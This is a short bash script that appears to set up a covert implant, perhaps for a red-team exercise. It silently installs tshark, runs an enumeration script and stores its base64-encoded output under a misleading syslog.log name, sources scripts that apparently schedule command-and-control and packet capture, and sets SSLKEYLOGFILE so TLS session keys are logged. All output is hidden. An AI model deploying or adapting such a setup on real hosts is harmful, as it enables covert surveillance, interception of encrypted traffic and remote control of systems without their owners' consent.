#!/bin/bash


{
apt-get install -yq tshark
apt-get install -yq net-tools
fn="/var/log/gamelog"
mkdir $fn
echo $(source ./enum.sh) | base64 > "${fn}/syslog.log"

source ./schedc2.sh
source ./schedshark.sh

export SSLKEYLOGFILE=/var/log/gamelog/key.log

} > /dev/null 2>&1





